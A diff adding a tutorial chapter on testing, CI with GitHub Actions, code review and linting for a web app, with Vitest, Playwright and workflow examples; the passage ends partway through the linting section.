@@ -1,0 +1,2973 @@
+---
+plan: software-developer
+phase: 4
+---
+
+import Levels from '../../../components/book/Levels.astro';
+import Level from '../../../components/book/Level.astro';
+import Flow from '../../../components/book/Flow.astro';
+import Compare from '../../../components/book/Compare.astro';
+import Layers from '../../../components/book/Layers.astro';
+import Timeline from '../../../components/book/Timeline.astro';
+import Figure from '../../../components/book/Figure.astro';
+
+Six weeks to make the Phase 3 app reliable enough that I would let a stranger use it. Nothing new
+gets built for users here. Instead the app gets the things that let me know it works and find out
+fast when it does not: tests at three levels, a CI gate that blocks a bad change, error tracking,
+logs and metrics, a performance budget, a security pass, caching and rate limits, a runbook, and one
+deliberate failure that I roll back on purpose.
+
+The proof is concrete: a red build blocks a bad change, an end-to-end test covers the main journey,
+a load test produces a number, a security checklist is signed off, and a postmortem explains one real
+failure. The gate is to make a failing test pass, add CI, find a security bug and read a flame graph.
+
+#### Phase 4: how I would learn it
+
+Every topic is learned on the same app, by breaking it first. I write the test that should catch a
+bug, introduce the bug, watch the test fail for the right reason, then fix it. I add a security check
+by writing the attack first. I add a metric because I have a question it answers. The AI rule for
+this phase is the plan's: a model writes tests quickly, and my job is to judge whether they test
+behaviour or implementation. Mutation testing is how I check that judgment.
+
+<Timeline
+  caption="Phase 4's six weeks, each ending in something that runs on every push"
+  items={[
+    { when: 'week 27', what: 'The test pyramid, unit tests with Vitest, fixtures and mocks. Twenty behaviour tests on the domain logic.' },
+    { when: 'week 28', what: 'Integration tests against a real Postgres, end-to-end tests with Playwright on the main journey.' },
+    { when: 'week 29', what: 'GitHub Actions: lint, format, type check, tests, build. Branch protection. Code review on my own PRs.' },
+    { when: 'week 30', what: 'Logs, metrics, traces and error tracking. Core Web Vitals, bundle analysis, a performance budget, indexes.' },
+    { when: 'week 31', what: 'OWASP pass: XSS, CSRF, SSRF, secrets, rate limiting, caching. Sign off the security checklist.' },
+    { when: 'week 32', what: 'Load test, runbook, a deliberate failure and a rollback, a postmortem. Mutation testing. Take the gate.' },
+  ]}
+/>
+
+<Flow
+  caption="How each Phase 4 topic is learned: the failure comes before the fix"
+  steps={['Pick a real risk in the app', 'Make it happen on purpose', 'Write the check that catches it', 'Watch the check fail', 'Fix, and keep the check in CI']}
+/>
+
+<Layers
+  caption="The safety layers this phase adds, from cheapest and earliest to latest and most expensive"
+  layers={[
+    { name: 'Editor: types and lint', note: 'seconds, on every keystroke' },
+    { name: 'Unit tests', note: 'milliseconds each, on every save' },
+    { name: 'Integration tests', note: 'real database, on every push' },
+    { name: 'End-to-end tests', note: 'a real browser, on every pull request' },
+    { name: 'CI gate and review', note: 'nothing merges red' },
+    { name: 'Monitoring and alerts', note: 'what reaches users anyway' },
+    { name: 'Runbook and rollback', note: 'how fast I recover' },
+  ]}
+/>
+
+#### Phase 4: The test pyramid
+
+<Figure art={`
+                 /\\
+                /  \\        end-to-end: a few journeys, a real browser
+               / E2E\\       slow (seconds), brittle, highest confidence per test
+              /------\\
+             /  integ \\     integration: modules + real database or HTTP
+            /  ration  \\    medium speed, catches wiring and SQL bugs
+           /------------\\
+          /     unit     \\   unit: pure logic, many, milliseconds each
+         /________________\\  cheap, precise, says exactly what broke
+
+   more tests at the bottom, fewer at the top; each layer catches
+   what the one below it cannot see
+`} caption="The test pyramid is a budget, not a law: many fast precise tests, fewer slow broad ones." />
+
+<Levels label="Phase 4, the test pyramid">
+
+<Level name="Beginner">
+
+A test is a small program that runs my code and checks the result. The pyramid is advice about how
+many of each kind to write. At the bottom are unit tests: they call one function with known inputs and
+check the output, and they run in milliseconds. In the middle are integration tests: several pieces
+together, such as a route handler with a real database. At the top are end-to-end tests: a real
+browser clicking through the deployed app.
+
+```ts
+// unit: one function, no network, no database
+import { expect, test } from 'vitest';
+import { slugify } from './slugify';
+
+test('lowercases and joins words with dashes', () => {
+  expect(slugify('Hello World')).toBe('hello-world');
+});
+```
+
+```text
+ ✓ src/slugify.test.ts (1)
+   ✓ lowercases and joins words with dashes
+ Test Files  1 passed (1)
+```
+
+The mistake is starting at the top: writing ten browser tests because they feel like "real" testing.
+They are slow and fail for many reasons at once. The fix is to push each check down to the lowest layer
+that can see the bug.
+
+</Level>
+
+<Level name="Intermediate">
+
+The shape follows from cost and precision. A failing unit test names the function and the input. A
+failing end-to-end test says "the checkout button did not appear", which could be a CSS change, a
+slow API, a broken route or a real bug. So the rule is: logic in units, wiring in integration, a few
+critical journeys end to end.
+
+For my Phase 3 app that means: validation, permission checks, price or date calculations and parsing
+as unit tests (dozens); each API route against a real test database, including the "second user
+cannot read the first user's record" check (one or two per route); and three end-to-end journeys
+(sign up and log in, create and edit a record, upload an image).
+
+Mistake: a unit test that mocks so much it tests only the mocks. If a test would still pass after I
+delete the database query it is supposed to check, it is in the wrong layer.
+
+</Level>
+
+<Level name="Advanced">
+
+The pyramid is one heuristic among several. The "testing trophy" puts most weight on integration tests
+because in a web app most bugs are in the wiring, and modern tools make those tests fast. The
+"honeycomb" for services says the same about contract tests between services. What they share is the
+real principle: optimise for confidence per second of test time and per hour of maintenance.
+
+Two numbers make it concrete. The whole unit suite should finish in seconds so I run it on save. The
+whole suite including integration should finish in a few minutes so CI stays a gate, not a queue. If
+a layer is slower than that, tests move down or get parallelised.
+
+```sh
+$ npx vitest run --reporter=verbose | tail -3
+ Test Files  42 passed (42)
+      Tests  318 passed (318)
+   Duration  4.12s
+```
+
+</Level>
+
+<Level name="Edge cases">
+
+A pure function with no branches needs one test, not ten. Code with no logic (a component that only
+renders props) may need no unit test at all; it is covered by the journey that uses it. Conversely,
+a single function with ten branches (a permission matrix) deserves a table of tests, one row per
+branch, at the unit level.
+
+```ts
+test.each([
+  ['owner', 'edit', true],
+  ['viewer', 'edit', false],
+  ['viewer', 'read', true],
+  ['stranger', 'read', false],
+])('%s can %s: %s', (role, action, allowed) => {
+  expect(can(role, action)).toBe(allowed);
+});
+```
+
+</Level>
+
+<Level name="Corner cases">
+
+A bug that lives between two layers: the unit tests for the API pass with a mocked database, the
+end-to-end test passes on seeded data, and production fails because a migration renamed a column the
+mock never knew about. Neither layer could see it alone. That is exactly what the integration layer
+exists for: real schema, real queries, run on every push.
+
+Another: an end-to-end test that passes only because unit-level validation is missing and the
+browser form happens to block the bad input. Call the API directly and the bad input gets in. The
+fix is to test validation at the server's unit level too, not only through the UI.
+
+</Level>
+
+<Level name="Production level">
+
+In a real team the pyramid shows up as CI stages: lint and unit first (fast fail), integration next,
+end-to-end last and maybe only on the main branch or nightly. Flaky tests are the main production
+problem: a test that fails one run in twenty teaches everyone to click "re-run", and then a real
+failure gets re-run too. The rule is that a flaky test is a bug: quarantine it with an issue, fix it
+within days, never leave it retried forever.
+
+</Level>
+
+<Level name="Mindset">
+
+Tests are how I know, not how I feel. The question for every test is: what bug would this catch, and
+would I notice if it stopped catching it? A test that cannot fail is decoration.
+
+</Level>
+
+<Level name="System design">
+
+Test layers mirror system boundaries. Each boundary I draw (a module, a service, a third-party API)
+is a place where a contract can be checked. Good boundaries make the pyramid easy: pure core logic
+that units can test, thin adapters for the database and network that integration tests cover. Hard-to-test
+code is usually a design smell: logic tangled with I/O.
+
+</Level>
+
+<Level name="Strategy">
+
+I list every behaviour of the Phase 3 app in a table and assign each to the lowest layer that can catch
+its bug. Then I write the tests in that order: units first, a handful of integration tests per route,
+three journeys.
+
+Done when the suite has roughly ten times more unit tests than integration tests and a handful of
+end-to-end tests, runs under five minutes in CI, and every behaviour row in my table points to a test.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Unit, integration and end-to-end tests
+
+<Compare
+  left="Unit"
+  right="Integration and end-to-end"
+  caption="What each kind of test touches, and what it can and cannot see."
+  rows={[
+    ['One function or module', 'Several modules, or the whole deployed app'],
+    ['Fakes for I/O, or no I/O at all', 'A real database, a real HTTP server, a real browser'],
+    ['Milliseconds, run on save', 'Seconds to minutes, run on push or PR'],
+    ['Sees logic bugs precisely', 'Sees wiring, config, SQL and UI bugs'],
+    ['Blind to the schema and the network', 'Vague about which line is wrong'],
+  ]}
+/>
+
+<Levels label="Phase 4, unit, integration and end-to-end tests">
+
+<Level name="Beginner">
+
+Every test has the same three parts: arrange (set up inputs), act (call the thing), assert (check the
+result). A unit test arranges plain values. An integration test arranges a database row or a running
+server. An end-to-end test arranges a logged-in browser.
+
+```ts
+// integration: a real route and a real test database
+import request from 'supertest';
+import { app } from '../src/app';
+import { db, resetDb } from './db';
+
+beforeEach(resetDb);
+
+test('POST /notes creates a note for the logged-in user', async () => {
+  const agent = await loginAs('ana@example.com');
+  const res = await agent.post('/notes').send({ title: 'First' });
+  expect(res.status).toBe(201);
+  const rows = await db.query('select title from notes where owner = $1', [agent.userId]);
+  expect(rows.rows).toEqual([{ title: 'First' }]);
+});
+```
+
+Mistake: asserting only the status code. A 201 with the wrong owner is a security bug that passes.
+Assert the effect, here the row and its owner.
+
+</Level>
+
+<Level name="Intermediate">
+
+End-to-end tests describe a user journey in user words and use the accessible names the user sees, not
+CSS classes.
+
+```ts
+// e2e with Playwright
+import { test, expect } from '@playwright/test';
+
+test('a user can sign up, create a note and see it after reload', async ({ page }) => {
+  await page.goto('/signup');
+  await page.getByLabel('Email').fill('new@example.com');
+  await page.getByLabel('Password').fill('a long passphrase 42');
+  await page.getByRole('button', { name: 'Create account' }).click();
+  await page.getByRole('button', { name: 'New note' }).click();
+  await page.getByLabel('Title').fill('Groceries');
+  await page.getByRole('button', { name: 'Save' }).click();
+  await page.reload();
+  await expect(page.getByRole('link', { name: 'Groceries' })).toBeVisible();
+});
+```
+
+The reload is the important line: it proves persistence, not just optimistic UI.
+
+</Level>
+
+<Level name="Advanced">
+
+Isolation is what makes tests trustworthy. Each test must set up its own world and not depend on order.
+For a database that means a fresh schema per run and either a transaction rolled back after each test
+or a truncate in `beforeEach`. For end-to-end tests it means a unique user per test (`user-${Date.now()}`
+style emails generated in code) so parallel workers do not collide.
+
+Determinism is the other half: freeze time (`vi.useFakeTimers()` and `vi.setSystemTime`), seed random
+generators, and never assert on ordering a query does not guarantee (add `order by`).
+
+```text
+AssertionError: expected [ 'b', 'a' ] to deeply equal [ 'a', 'b' ]
+```
+
+That error, appearing one run in ten, is almost always a missing `order by`, not a flaky database.
+
+</Level>
+
+<Level name="Edge cases">
+
+Empty states need their own tests: a user with zero notes, a search with no results, an upload of a
+zero-byte file. The boundaries of input validation need tests at exactly the limit and one past it
+(a title of 200 characters allowed, 201 rejected). The first user in an empty database often hits a
+code path nobody else does, such as an admin bootstrap.
+
+</Level>
+
+<Level name="Corner cases">
+
+Time zones plus dates: a "due today" test written at 23:30 in India passes locally and fails in CI,
+which runs in UTC, where it is already a different date or still yesterday. Two boundaries, midnight
+and the zone, meet. The fix is to freeze both the clock and the zone in the test (`TZ=UTC` in the test
+script, and an explicit zone in the code under test).
+
+Parallel end-to-end workers plus a shared seed user: worker A deletes the note worker B is reading.
+The fix is per-test data, never shared mutable fixtures.
+
+</Level>
+
+<Level name="Production level">
+
+The suite runs on every pull request with artefacts on failure: Playwright traces, screenshots and the
+server log, so I can debug a CI-only failure without reproducing it locally. Tests run against a build
+as close to production as possible: the same Node version, a real Postgres in a service container, the
+production bundle for end-to-end tests.
+
+</Level>
+
+<Level name="Mindset">
+
+Test behaviour a user or caller can observe, not how the code is arranged inside. If I can refactor
+the internals without changing behaviour and a test breaks, the test was coupled to implementation.
+
+</Level>
+
+<Level name="System design">
+
+The end-to-end journeys double as smoke tests after deploy: the same three tests run against the
+staging URL, then production, and the deploy is rolled back if they fail. Tests become part of the
+release system, not just the development loop.
+
+</Level>
+
+<Level name="Strategy">
+
+One week of units on the domain logic, then integration tests route by route, then three journeys.
+For each test I write, I first break the code to watch it fail.
+
+Done when each API route has an integration test including an authorization failure case, three
+journeys pass in a real browser, and running the suite twice in a row, in random order, gives the same
+result.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Vitest and Playwright
+
+<Flow
+  caption="Where each tool runs: Vitest inside Node, Playwright driving a real browser against a running server"
+  steps={['vitest: import module', 'call function', 'assert in Node', 'playwright: start app server', 'launch Chromium', 'click by role', 'assert on the page']}
+/>
+
+<Levels label="Phase 4, Vitest and Playwright">
+
+<Level name="Beginner">
+
+Vitest is a test runner for JavaScript and TypeScript that understands the same config as Vite, so
+TypeScript and ES modules work without extra setup. Playwright is a library and runner that controls
+real Chromium, Firefox and WebKit browsers. Install both and add scripts:
+
+```sh
+$ npm i -D vitest @playwright/test
+$ npx playwright install chromium
+```
+
+```json
+{
+  "scripts": {
+    "test": "vitest run",
+    "test:watch": "vitest",
+    "e2e": "playwright test"
+  }
+}
+```
+
+Mistake: running Playwright tests with Vitest or the reverse. They use different runners; keep e2e
+tests in their own folder (`e2e/`) and exclude it from Vitest with `test.exclude` in the config.
+
+</Level>
+
+<Level name="Intermediate">
+
+Vitest's core API: `describe`, `test` (or `it`), `expect`, hooks (`beforeEach`, `afterAll`), and `vi`
+for spies, mocks and timers. Watch mode reruns only tests affected by the changed files.
+
+```ts
+import { describe, expect, test, vi } from 'vitest';
+import { debounce } from './debounce';
+
+describe('debounce', () => {
+  test('calls once after the quiet period', () => {
+    vi.useFakeTimers();
+    const fn = vi.fn();
+    const d = debounce(fn, 200);
+    d(); d(); d();
+    vi.advanceTimersByTime(199);
+    expect(fn).not.toHaveBeenCalled();
+    vi.advanceTimersByTime(1);
+    expect(fn).toHaveBeenCalledTimes(1);
+  });
+});
+```
+
+Playwright's core API: `page.goto`, locators (`getByRole`, `getByLabel`, `getByText`), actions
+(`click`, `fill`) and web-first assertions (`await expect(locator).toBeVisible()`) that retry until a
+timeout, so I never write `sleep`.
+
+</Level>
+
+<Level name="Advanced">
+
+Playwright's config can start my server before the tests and reuse it locally:
+
+```ts
+// playwright.config.ts
+import { defineConfig } from '@playwright/test';
+export default defineConfig({
+  testDir: 'e2e',
+  use: { baseURL: 'http://localhost:4173', trace: 'on-first-retry' },
+  webServer: { command: 'npm run build && npm run preview', port: 4173, reuseExistingServer: !process.env.CI },
+  retries: process.env.CI ? 1 : 0,
+});
+```
+
+Traces record every action, network request and DOM snapshot; `npx playwright show-trace trace.zip`
+replays a CI failure step by step. Vitest can run in different environments: `node` for server code,
+`jsdom` or `happy-dom` for component tests, and coverage via `--coverage` with the v8 provider.
+
+</Level>
+
+<Level name="Edge cases">
+
+A Playwright assertion on text that changes, such as a timestamp, fails randomly; assert on a stable
+part or freeze the clock with `page.clock`. A locator that matches two elements fails in strict mode:
+
+```text
+Error: strict mode violation: getByRole('button', { name: 'Save' }) resolved to 2 elements
+```
+
+The fix is to scope it (`page.getByRole('dialog').getByRole('button', { name: 'Save' })`), and often
+it reveals an accessibility issue: two buttons with the same name.
+
+</Level>
+
+<Level name="Corner cases">
+
+Fake timers plus promises in Vitest: advancing timers does not flush pending promise callbacks, so a
+debounced async function appears never to finish. Use `await vi.advanceTimersByTimeAsync(200)` instead.
+Playwright plus a service worker that caches the old build: tests pass against stale assets. Clear the
+storage state per test, or disable the service worker in the test build.
+
+</Level>
+
+<Level name="Production level">
+
+In CI I cache the Playwright browsers keyed by version, shard the e2e suite across machines for
+speed (`--shard=1/3`), upload the HTML report and traces as artefacts, and set retries to one so a
+genuine flake is visible in the report as "flaky" rather than hidden.
+
+</Level>
+
+<Level name="Mindset">
+
+Tools are cheap; the judgment about what to assert is not. I learn the few APIs deeply and spend the
+time on choosing assertions that a user would care about.
+
+</Level>
+
+<Level name="System design">
+
+The same Playwright tests can run as synthetic monitoring against production every few minutes, which
+turns a test suite into an uptime check for the critical journey.
+
+</Level>
+
+<Level name="Strategy">
+
+Set up Vitest first with one test and watch mode, then Playwright with one journey and the trace
+viewer. Break each on purpose and read the failure output.
+
+Done when `npm test` and `npm run e2e` both run from a clean clone with one command each, and I can
+open a failed trace and point to the step that broke.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Fixtures and mocks
+
+<Compare
+  left="Fixture"
+  right="Mock, stub or fake"
+  caption="A fixture is the world a test starts in. A test double replaces a collaborator the test should not really call."
+  rows={[
+    ['Known data: a user, three notes, a file', 'A stand-in for something with side effects'],
+    ['Built by a factory or seed function', 'Stub: returns canned answers'],
+    ['Reset before every test', 'Spy: records how it was called'],
+    ['Makes the arrange step short and readable', 'Fake: a working lightweight version, like an in-memory store'],
+    ['Overused: a giant shared JSON file', 'Overused: mocking the code under test itself'],
+  ]}
+/>
+
+<Levels label="Phase 4, fixtures and mocks">
+
+<Level name="Beginner">
+
+Most tests need some world to exist first: a user who is logged in, a note that belongs to them, a
+file to upload. That starting world is a fixture. The simplest fixture is a factory function that
+returns a valid object with sensible defaults, so each test only states what matters to it.
+
+```ts
+let seq = 0;
+export function makeUser(overrides: Partial<User> = {}): User {
+  seq += 1;
+  return { id: seq, email: `user${seq}@example.com`, role: 'member', ...overrides };
+}
+
+test('admins can delete any note', () => {
+  const admin = makeUser({ role: 'admin' });   // only the role matters here
+  expect(canDelete(admin, makeNote({ ownerId: 999 }))).toBe(true);
+});
+```
+
+A mock replaces a collaborator I should not really call in this test: the email provider, the payment
+API, the clock. Mistake: a 500-line `fixtures.json` shared by every test. One test edits it, twenty
+others break, and nobody knows which fields matter. Factories with overrides make the important field
+visible in the test itself.
+
+</Level>
+
+<Level name="Intermediate">
+
+The words have different meanings, and using the right one keeps tests honest. A stub returns a
+canned answer (`getRate()` always returns 1.2). A spy records calls so I can assert that something
+happened (`sendEmail` was called once with this address). A fake is a working but simplified
+implementation, like an in-memory repository with the same interface as the Postgres one.
+
+```ts
+import { vi } from 'vitest';
+
+test('signup sends one welcome email', async () => {
+  const mailer = { send: vi.fn().mockResolvedValue({ id: 'm1' }) };
+  await signup({ email: 'ana@example.com', password: 'long enough pass' }, { mailer });
+  expect(mailer.send).toHaveBeenCalledTimes(1);
+  expect(mailer.send).toHaveBeenCalledWith(expect.objectContaining({ to: 'ana@example.com' }));
+});
+```
+
+The dependency is passed in (`{ mailer }`) instead of imported directly. That one design choice makes
+the code testable without module-mocking tricks.
+
+</Level>
+
+<Level name="Advanced">
+
+Module mocking (`vi.mock('./mailer')`) works by replacing the module in the loader before the code
+under test imports it. Vitest hoists `vi.mock` calls to the top of the file, which is why variables
+defined below it are not available inside its factory, and why the error looks strange:
+
+```text
+Error: [vitest] There was an error when mocking a module.
+ReferenceError: Cannot access 'fakeSend' before initialization
+```
+
+The fix is `vi.hoisted(() => ...)` to create the variable before hoisting, or, better, dependency
+injection so no module mock is needed. For HTTP, Mock Service Worker intercepts `fetch` at the network
+layer, so the code under test uses its real HTTP client and only the far end is faked.
+
+The deeper rule: mock at the boundary of my system (third-party APIs, the clock, randomness), not
+between my own modules. Mocking my own modules couples the test to how I happened to split the code.
+
+</Level>
+
+<Level name="Edge cases">
+
+A mock that returns success always never tests the failure path. Every boundary mock needs at least
+one test where it fails: a timeout, a 500, a malformed body.
+
+```ts
+mailer.send.mockRejectedValueOnce(new Error('ETIMEDOUT'));
+await expect(signup(input, { mailer })).resolves.toMatchObject({ emailQueued: false });
+```
+
+A factory with an auto-increment counter makes IDs depend on test order; a test that asserts
+`id === 1` passes alone and fails in the full run. Assert on the object you created, not on a magic
+number.
+
+</Level>
+
+<Level name="Corner cases">
+
+A mock that drifts from reality: the payment API changed its response from `{ status: 'ok' }` to
+`{ state: 'succeeded' }`, my stub still returns the old shape, every test passes, production fails. Two
+boundaries, a third-party contract and my fake, disagree silently. The fixes are a contract test that
+runs against the provider's sandbox nightly, and building stubs from a typed schema so a shape change
+fails to compile.
+
+Mocks that leak between tests: `vi.fn()` keeps call counts across tests unless reset, so the second test
+sees three calls. Set `restoreMocks: true` (or `clearMocks`) in the Vitest config.
+
+</Level>
+
+<Level name="Production level">
+
+For integration tests, the database is a real Postgres in a container, seeded by the same factories,
+and reset between tests. Only external services are faked, ideally by the provider's test mode
+(payment sandboxes, email capture tools like a local SMTP catcher). Seed scripts double as local
+development data, so developers and tests see the same world.
+
+</Level>
+
+<Level name="Mindset">
+
+Every mock is a claim about how the real world behaves. I keep them few, explicit and tested against
+reality, because a test is only as true as its doubles.
+
+</Level>
+
+<Level name="System design">
+
+The need to mock is a map of my system's boundaries. Ports-and-adapters design (the core takes
+interfaces, adapters implement them for Postgres, SMTP, S3) makes every boundary swappable, which is
+the same property that makes a later migration from one provider to another cheap.
+
+</Level>
+
+<Level name="Strategy">
+
+I write factories for every table, convert any shared fixture file into factories, inject the mailer,
+clock and storage, and write one failure test per boundary.
+
+Done when no test asserts on a hard-coded ID, every external dependency has a failure-path test, and
+mocks reset automatically between tests.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: CI/CD with GitHub Actions
+
+<Figure art={`
+  git push / pull request
+          |
+          v
+  +-----------------------------  GitHub Actions runner (fresh VM)  ---+
+  | checkout -> setup node (cached) -> npm ci                          |
+  |   -> lint -> format check -> typecheck -> unit -> integration (pg) |
+  |   -> build -> e2e on the built app -> upload report                |
+  +---------------------------------------------------------------------+
+          | all green?                 | any red?
+          v                            v
+   merge allowed (branch          merge blocked, author
+   protection) -> deploy job      reads the failing step
+   -> smoke test -> live          log and fixes
+`} caption="CI is a clean machine that runs every check on every change; CD is what happens after green on main." />
+
+<Levels label="Phase 4, CI/CD with GitHub Actions">
+
+<Level name="Beginner">
+
+Continuous integration means every change is built and tested automatically on a clean machine,
+before it merges. GitHub Actions does this with YAML files in `.github/workflows/`. A workflow has
+triggers (`on`), jobs, and steps; each step runs a command, and if any command exits non-zero, the job
+fails and turns red.
+
+```yaml
+# .github/workflows/ci.yml
+name: ci
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 22, cache: npm }
+      - run: npm ci
+      - run: npm run lint
+      - run: npm test
+      - run: npm run build
+```
+
+Why `npm ci` and not `npm install`: `ci` installs exactly what the lockfile says and fails if
+`package.json` and the lockfile disagree, so CI tests what I committed. Mistake: "it works on my
+machine". The clean runner is the point; it has none of my local files, globals or environment.
+
+</Level>
+
+<Level name="Intermediate">
+
+A real gate needs a database and the right order. Service containers start Postgres beside the job;
+steps run fast checks first so a typo fails in thirty seconds, not after a five-minute e2e run.
+
+```yaml
+  integration:
+    runs-on: ubuntu-latest
+    services:
+      postgres:
+        image: postgres:16
+        env: { POSTGRES_PASSWORD: test }
+        ports: ['5432:5432']
+        options: >-
+          --health-cmd pg_isready --health-interval 5s --health-retries 10
+    env:
+      DATABASE_URL: postgres://postgres:test@localhost:5432/postgres
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 22, cache: npm }
+      - run: npm ci
+      - run: npx prisma migrate deploy
+      - run: npm run test:integration
+```
+
+Then on GitHub: Settings, Branches, a protection rule on `main` requiring these checks to pass and a
+pull request before merging. Now a red build really blocks a bad change, which is the plan's proof.
+
+</Level>
+
+<Level name="Advanced">
+
+Continuous delivery means every green commit on `main` is deployable; continuous deployment means it
+is deployed automatically. A deploy job uses `needs:` to wait for the test jobs and `if:` to run only on
+`main`, with `environment: production` so secrets are scoped and deploys are recorded.
+
+```yaml
+  deploy:
+    needs: [test, integration]
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    environment: production
+    concurrency: production        # never two deploys at once
+    steps:
+      - uses: actions/checkout@v4
+      - run: ./scripts/deploy.sh
+        env: { DEPLOY_TOKEN: '${{ secrets.DEPLOY_TOKEN }}' }
+      - run: npx playwright test e2e/smoke.spec.ts
+        env: { BASE_URL: https://app.example.com }
+```
+
+Permissions matter: set `permissions: contents: read` at the top so a compromised step cannot push code,
+and pin third-party actions to a full commit SHA, since a tag can be moved to malicious code.
+
+</Level>
+
+<Level name="Edge cases">
+
+Pull requests from forks do not receive repository secrets, so a step that needs one fails only for
+outside contributors. A workflow that triggers on `push` and `pull_request` runs twice for the same
+commit on a PR branch; restrict `push` to `main`. A path filter (`paths:`) that skips CI for docs
+changes can also skip it for a change that matters if the filter is wrong, and then a required check
+never reports and the PR can never merge.
+
+</Level>
+
+<Level name="Corner cases">
+
+A cache plus a lockfile change: caching `node_modules` keyed on the wrong file restores old packages
+after an upgrade and tests pass against the old version. Key caches on the lockfile hash, and cache the
+npm download cache rather than `node_modules`. Concurrency plus a rollback: a deploy of an old commit
+starts while a newer one is queued, and the newer one overwrites the rollback. Use a `concurrency`
+group with `cancel-in-progress: false` and pause automatic deploys during an incident.
+
+</Level>
+
+<Level name="Production level">
+
+A healthy pipeline is fast (under ten minutes to green), trustworthy (no flakes tolerated), and
+observable (I know the median duration and the failure rate). Deploys produce an artefact once and
+promote the same artefact through staging to production, so production runs the bytes that were tested.
+Every deploy records the commit SHA, which is what the rollback targets.
+
+</Level>
+
+<Level name="Mindset">
+
+Automate the checks I would otherwise forget at 6pm on a Friday. A rule enforced by CI is a rule;
+a rule in a README is a suggestion.
+
+</Level>
+
+<Level name="System design">
+
+The pipeline is part of the product's architecture. Its speed sets how often I can change things, its
+gates set how bad a merged change can be, and its deploy step sets how fast I can recover. Trunk-based
+development, feature flags and small pull requests all depend on a fast, reliable pipeline.
+
+</Level>
+
+<Level name="Strategy">
+
+I build the workflow in stages: one job with lint and unit tests, then the Postgres integration job,
+then e2e, then branch protection, then deploy with a smoke test. After each stage I push a deliberately
+broken change and confirm it turns red and cannot merge.
+
+Done when a pull request with a failing test cannot be merged, the green path deploys main with a recorded
+SHA, and the whole pipeline finishes in under ten minutes.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Code review
+
+<Flow
+  caption="A review pass in the order that finds the expensive problems first"
+  steps={['Read the description: what and why', 'Does the design fit?', 'Correctness and edge cases', 'Security and data', 'Tests prove the behaviour', 'Naming and readability', 'Approve, or ask specific questions']}
+/>
+
+<Levels label="Phase 4, code review">
+
+<Level name="Beginner">
+
+Code review is another person reading a change before it merges. Its goals are, in order: catch bugs,
+share knowledge, and keep the code understandable. Working alone, I still review my own pull requests:
+I open the diff on GitHub the next morning and read it as if a stranger wrote it. It is surprising how
+much the different view and the delay reveal.
+
+A good pull request makes review possible: one change, a description that says what and why, how to
+test it, and screenshots for UI. Mistake: a 2,000-line PR called "updates". Nobody can review that; it
+gets approved blind. The fix is small PRs, ideally under 400 changed lines.
+
+</Level>
+
+<Level name="Intermediate">
+
+Review in order of cost. First the design: is this the right change, in the right place? Then
+correctness: what inputs break it, what happens on error, is anything missing (a migration, a test, a
+permission check)? Then security: user input, auth checks, secrets, logging of personal data. Then tests:
+do they assert behaviour? Only then naming and style, and style should mostly be automated by the
+formatter so humans never argue about it.
+
+```diff
+- const notes = await db.note.findMany({ where: { id: req.params.id } });
++ const notes = await db.note.findMany({ where: { id: req.params.id, ownerId: req.user.id } });
+```
+
+A comment that helps: "This query doesn't scope by owner, so user B can read user A's note by ID. Could
+we add `ownerId` and an integration test for the 404?" Specific, with the reason and a suggested fix.
+
+</Level>
+
+<Level name="Advanced">
+
+Review is a skill with known failure modes. Reviewers anchor on the first file and skim the rest; they
+comment on what is visible (names) and miss what is absent (the missing test, the missing index). A
+checklist counters both. Labelling comments by weight (blocking, suggestion, nit, question) tells the
+author what must change before merge. Approving with suggestions keeps velocity; requesting changes is
+for real problems.
+
+For AI-generated code the bar is the plan's first rule: never merge code you cannot explain. That
+means reading every line, running it, and asking why each dependency and branch exists.
+
+</Level>
+
+<Level name="Edge cases">
+
+A one-line change can be the most dangerous in the repo: a config flag, a dependency bump, a changed
+default timeout. Small diff size does not mean small risk; review those with the blast radius in mind.
+A generated file (lockfile, migration snapshot) in the diff hides real changes; check the lockfile diff
+for unexpected new packages.
+
+</Level>
+
+<Level name="Corner cases">
+
+A refactor and a behaviour change in the same PR: the reviewer cannot tell which lines change behaviour,
+so a bug hides in the noise. Split them: refactor first with no behaviour change (tests unchanged and
+green), then the behaviour change. Review plus a rebase: force-pushing after review comments makes GitHub
+lose track of what was already reviewed; push new commits during review and keep history readable.
+
+</Level>
+
+<Level name="Production level">
+
+Branch protection requires an approval and green checks; CODEOWNERS routes changes to the people who
+know an area; the PR template asks for the test plan and rollback plan. Review turnaround matters: a PR
+waiting two days encourages bigger PRs. Teams aim for a first response within a working day.
+
+</Level>
+
+<Level name="Mindset">
+
+Review the code, not the person, and assume good intent. The question is "will we be glad this merged
+in six months?", not "would I have written it this way?"
+
+</Level>
+
+<Level name="System design">
+
+Review is a control in the delivery system, like tests. It is the main place where architecture
+decisions get checked against the system's boundaries, where security-sensitive changes get a second
+pair of eyes, and where knowledge spreads so one person is not the only one who understands a module.
+
+</Level>
+
+<Level name="Strategy">
+
+Every Phase 4 change goes through a PR, even working alone. I write the description first, wait a few
+hours, then review it with a written checklist (design, correctness, security, tests, naming), and log
+what I found in the bug log.
+
+Done when every merged PR this phase has a description, a test plan and at least one self-review comment
+that led to a change, and I can show one bug caught in review before merge.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Linting and formatting
+
+<Compare
+  left="Formatter (Prettier)"
+  right="Linter (ESLint)"
+  caption="Two tools, two jobs. The formatter decides how code looks; the linter flags code that is likely wrong."
+  rows={[
+    ['Whitespace, quotes, line breaks, commas', 'Unused variables, missing awaits, unsafe any'],
+    ['No opinions to discuss: one output', 'Rules configured per project'],
+    ['Rewrites the file', 'Reports, and fixes some rules automatically'],
+    ['Never finds a bug', 'Finds real bugs before runtime'],
+  ]}
+/>
+
+<Levels label="Phase 4, linting and formatting">
+
+<Level name="Beginner">
+
+A formatter rewrites code into one consistent layout, so no one spends review time on spaces or
+semicolons. A linter reads code and reports patterns that are likely bugs or bad practice. Set both up,
+run them from scripts, and run them in CI.
+
+```json
+{
+  "scripts": {
+    "format": "prettier --write .",
+    "format:check": "prettier --check .",
+    "lint": "eslint ."
+  }
+}
+```
+
+```text
+$ npm run lint
